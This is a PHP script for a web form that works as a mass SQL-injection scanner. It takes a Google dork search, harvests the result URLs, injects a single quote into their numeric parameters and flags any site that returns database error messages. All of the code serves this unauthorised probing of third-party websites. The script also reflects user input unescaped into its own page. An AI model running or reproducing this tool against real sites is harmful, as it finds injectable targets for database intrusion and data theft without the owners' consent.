<?php if(!function_exists("curl_init")) exit("CURL REQUIRED"); ?>

<form id="form1" name="form1" method="post" action="<?=$PHP_SELF?>">

<link rel="stylesheet" type="text/css" href="../../css/default1.css">

<center>
<tr>
<td><label><font size="4" color="red"><b>Link Google For Scan:</b></font><br>
<b>Example:</b><br>
http://www.google.com/search?hl=en&source=hp&q=inurl%3A%22.php%3Fcatid%3D%22&meta=&btnG=Google+Search
<input name="query" type="text" id="query" size="150s" valuse="<?=$_POST[query]?>"/>
<br />
<br />
</label></td>
</tr> <tr>
<td align="center"><label>
<input type="submit" name="button" id="button" value="SCAN NOW!" />
</label></td>
</tr>
</center>
</form>


<?php
if (!empty($_POST[query]) ){
@set_time_limit(0);
@error_reporting(0);
@ignore_user_abort(true);
ini_set('memory_limit', '128M');

$fetch = fetch(trim($_POST[query])."&num=100" );
if ( strpos($fetch, "We're sorry...") !== false ) { print "GOOGLE ERROR"; exit ;}


//if(!preg_match_all("/cite\>([^\>]*>article\.php\?id[^\=]*=\d*)/i", $fetch, $mtc)) { print "GOOGLE2 ERROR"; exit ;}


if( !preg_match_all ("/a[\s]+href[\s]?=[\s\"\']+".
"http(.*?)[\"\']+.*?"."/",
$fetch, $matches)) { print "GOOGLE2 ERROR !!! "; exit ;}



foreach (array_unique($matches[0]) as $u) {
if ( strpos($u, "cache") !== false ) { continue ;}
if ( strpos($u, "google") !== false ) { continue ;}
if ( strpos($u, "download.com") !== false ) { continue ;}
if ( strpos($u, "youtube.com") !== false ) { continue ;}
if ( strpos($u, "javascript:void") !== false ) { continue ;}
$u = str_replace("a href=","",$u);
$u = str_replace("\"","",$u);
$url = str_replace("http://","",$u);


$offset =0;
$time = 0;
while(preg_match("/\=\d{1,}/", $url, $m, PREG_OFFSET_CAPTURE,$offset) ) {
if($time>3) break;
$offset = $m[0][1]+strlen( $m[0][0]);
$time++;
$_url = substr_replace ( $url , "'", $offset , 0);

if( preg_match_all("/\b(?:CF_SQL_INTEGER|80040e14|Incorrect syntax near ''.|error|MySQL|mysql|SQL syntax|query|Warning|Microsoft OLE DB|VBScript|JET Database|Unclosed|string|Incorrect)\b/i",
strip_tags(
html_entity_decode(
fetch($_url)) ) , $ws)) {

print "<strong><font color=green>====> $_url</font></strong>  <font color=blue>".implode(",", $ws[0])."</font><br>";


break; } else
{ echo $_url."<br>";
flush(); ob_flush(); }
}


if(!$time) {
$url = $url."'";
if( preg_match_all("/\b(?:CF_SQL_INTEGER|80040e14|Incorrect syntax near ''.|error|MySQL|mysql|SQL syntax|query|Warning|Microsoft OLE DB|VBScript|JET Database|Unclosed|string|Incorrect)\b/i",
strip_tags(
html_entity_decode(
fetch($url)) ) , $ws)) {

print "<strong><font color=green>====> $url</font></strong>   <font color=blue>".implode(",", $ws[0])."</font><br>";


} else
{ echo $url."<br>";
flush(); ob_flush(); }

}

}

}


function fetch($url) {

if(file_exists('stopfile')) exit;

$header[] = "Accept-Language: en";
$header[] = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";
$header[] = "Connection: Keep-Alive";
$header[] = "Pragma: no-cache";
$header[] = "Cache-Control: no-cache";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE );
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
if(!curl_setopt($ch, CURLOPT_TIMEOUT, 5)) {echo 'CURLOPT TIMEOUT Error';}
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
//curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookie.txt'); (B? // Tam thoi bo túi....kekeke)
//curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookie.txt'); (B? // Tam thoi bo túi....kekeke)
$page = curl_exec($ch);
curl_close($ch);

//echo $page."<HR>";

return $page;

}
?> 